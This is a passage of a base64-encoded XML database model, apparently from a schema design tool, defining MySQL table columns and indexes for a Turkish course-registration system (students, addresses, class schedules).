DaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFkcmVzIi8+CgkJCQkJCTwvbzI+CgkJCQkJCTxvMz4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjE3Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFrdGlmIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJha3RpZiIvPgoJCQkJCQk8L28zPgoJCQkJCQk8bzQ+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSJHaXJpbG1lbWnFnyIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iNyIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYmFiYUFkaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iYmFiYUFkaSIvPgoJCQkJCQk8L280PgoJCQkJCQk8bzU+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IkUsSywgRyhHaXJpbG1lbWnFnykiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iRyIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMTUiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjEiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iY2luc2l5ZXQiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImNpbnNpeWV0Ii8+CgkJCQkJCTwvbzU+CgkJCQkJCTxvNj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9IiIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9IiIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSI5Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSItMSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJkb2d1bVRhcmloaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkRhdGUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZG9ndW1UYXJpaGkiLz4KCQkJCQkJPC9vNj4KCQkJCQkJPG83PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iR2lyaWxtZW1pxZ8iLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjYiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjUwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImVwb3N0YSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZXBvc3RhIi8+CgkJCQkJCTwvbzc+CgkJCQkJCTxvOD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IjAwIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxMCIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMiIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJpbCIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJPC9vOD4KCQkJCQkJPG85PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSI5NDAiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjExIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIzIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImlsY2UiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iNSIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJTbWFsbGludCIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJpbGNlIi8+CgkJCQkJCTwvbzk+CgkJCQkJPC9maWVsZD4KCQkJCQk8aW5kZXg+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJZV1JwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFkaSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJhZGkiLz4KCQkJCQkJPC9vMD4KCQkJCQkJPG8xPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImEyRjVhWFJVWVhKcGFHaz0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iZGFuaXNtYW4iLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZGFuaXNtYW4iLz4KCQkJCQkJPC9vMT4KCQkJCQkJPG8yPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImFXeGpaUT09Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXIiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iRktfb2dyZW5jaWxlciIvPgoJCQkJCQk8L28yPgoJCQkJCQk8bzM+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNXBiVVIxY25WdGRRPT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iRktfb2dyZW5jaWxlcl9vZ3JlbmltZHVydW11Ii8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXJfb2dyZW5pbWR1cnVtdSIvPgoJCQkJCQk8L28zPgoJCQkJCQk8bzQ+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iZW1GdFlXNUVhV3hwYldrPSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJGS19vZ3JlbmNpbGVyX3phbWFuZGlsaW1pIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXJfemFtYW5kaWxpbWkiLz4KCQkJCQkJPC9vND4KCQkJCQkJPG81PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImFXdz0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJPC9vNT4KCQkJCQkJPG82PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImIyZHlaVzVqYVU1diIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJPC9vNj4KCQkJCQkJPG83PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImMyOTVZV1JwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InNveWFkaSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzb3lhZGkiLz4KCQkJCQkJPC9vNz4KCQkJCQk8L2luZGV4PgoJCQkJCTxuYW1lIHZhbHVlPSJvZ3JlbmNpbGVyIi8+CgkJCQkJPHVuaXF1ZT4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNWphVTV2Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCTwvbzA+CgkJCQkJPC91bmlxdWU+CgkJCQk8L28yPgoJCQkJPG8zPgoJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9Ijk3Ii8+CgkJCQkJCTxBdmVyYWdlX1Jvd19TaXplIHZhbHVlPSI1MTIiLz4KCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJPENyZWF0ZV9UaW1lIHZhbHVlPSIyMDE1LTAyLTE2IDE1OjU1OjU2Ii8+CgkJCQkJCTxFbmdpbmUgdmFsdWU9Iklubm9EQiIvPgoJCQkJCQk8RmllbGRfQ291bnQgdmFsdWU9IjMiLz4KCQkJCQkJPEluZGV4X0NvdW50IHZhbHVlPSIzIi8+CgkJCQkJCTxMaW5rX0NvdW50IHZhbHVlPSIxIi8+CgkJCQkJCTxOYW1lIHZhbHVlPSJkZXJzcHJvZ3JhbWkiLz4KCQkJCQkJPFByaW1hcnlfS2V5IHZhbHVlPSJhMkY1YVhST2J3PT0iLz4KCQkJCQkJPFJlY29yZF9Db3VudCB2YWx1ZT0iMzIiLz4KCQkJCQkJPFNpemUgdmFsdWU9IjQ4LjAwIEtiIi8+CgkJCQkJCTxUcmlnZ2VyX0NvdW50IHZhbHVlPSIwIi8+CgkJCQkJCTxVbmlxdWVfQ291bnQgdmFsdWU9IjIiLz4KCQkJCQkJPFVwZGF0ZV9UaW1lIHZhbHVlPSIiLz4KCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJPGNvbnRyb2wgdmFsdWU9IlRhYmxlMyIvPgoJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQk8ZmllbGQ+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9IiIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9IiIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIyIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSI2Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFjaWxhbkt1cnNObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSI3Ii8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9Ik1lZGl1bUludCIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJhY2lsYW5LdXJzTm8iLz4KCQkJCQkJPC9vMD4KCQkJCQkJPG8xPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjciLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ia2F5aXRObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIyMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCaWdJbnQiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIxIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ia2F5aXRObyIvPgoJCQkJCQk8L28xPgoJCQkJCQk8bzI+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjMiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjMiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ic2FhdEd1biIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ic2FhdEd1biIvPgoJCQkJCQk8L28yPgoJCQkJCTwvZmllbGQ+CgkJCQkJPGluZGV4PgoJCQkJCQk8bzA+CgkJCQkJCQk8Q2hhbmdlcyB